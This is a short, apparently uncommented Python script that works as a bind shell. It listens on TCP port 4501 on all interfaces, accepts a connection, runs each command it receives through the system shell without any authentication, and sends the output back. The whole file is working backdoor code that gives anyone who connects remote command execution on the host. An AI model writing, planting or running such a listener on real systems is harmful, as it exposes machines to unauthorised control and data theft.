import socket
import subprocess

connexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ''
port = 4501
connexion.bind((host, port))
connexion.listen(5)
connexion_client, infos_connexion = connexion.accept()
started = True

while started:
    rcv_cmd = connexion_client.recv(1024)
    rcv_cmd = rcv_cmd.decode()
    if rcv_cmd != "exit":
        cmd = subprocess.Popen(rcv_cmd, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        out = cmd.stdout.read() + cmd.stderr.read()
        connexion_client.send(out)
    else:
        started = False
        connexion.close()
        exit()
